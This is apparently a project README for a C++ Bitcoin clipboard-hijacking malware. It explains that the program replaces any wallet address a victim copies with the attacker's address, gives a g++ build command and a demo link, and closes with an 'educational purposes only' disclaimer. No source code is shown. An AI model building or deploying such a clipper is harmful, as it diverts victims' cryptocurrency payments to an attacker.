# What is a BTC-Clipper -
BTC Clipper is a malware that monitors the victim clipboard and wait for him to copy a BTC wallet address.
As soon as it detects the victim copied a bitcoin wallet address it will replace the address with the attacker address.
This type of malware can cause the victim to send the attacker address to receive payments insted of his address.

# About -
I built this BTC-Clipper in cpp so it is light weight and compatible with almost any windows machine.

# Installation -
You will need a c++ compailer like g++.

```bash
g++ bitcoinClipper.cpp -o bitcoinClipper.exe
```

# Demo -
![Demo](https://imgur.com/qhqrpBH)

# Disclaimer -
This project is for educational purposes only, I am not responsible for any kind of abuse.
